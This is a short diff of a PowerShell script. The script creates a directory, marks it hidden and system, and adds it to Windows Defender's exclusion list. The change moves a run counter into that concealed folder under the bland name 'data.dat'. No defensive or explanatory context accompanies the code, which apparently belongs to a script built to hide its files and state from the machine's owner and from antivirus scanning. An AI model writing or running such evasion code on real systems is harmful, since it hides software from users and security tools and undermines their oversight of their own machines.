@@ -6,7 +6,7 @@ New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 Add-MpPreference -ExclusionPath $dir
 
-$counterFile = "$env:USERPROFILE\run_counter.txt"
+$counterFile = "$dir\data.dat"
 $runCount = if (Test-Path $counterFile) { [int](Get-Content $counterFile) } else { 0 }
 $runCount++
 $runCount | Set-Content $counterFile
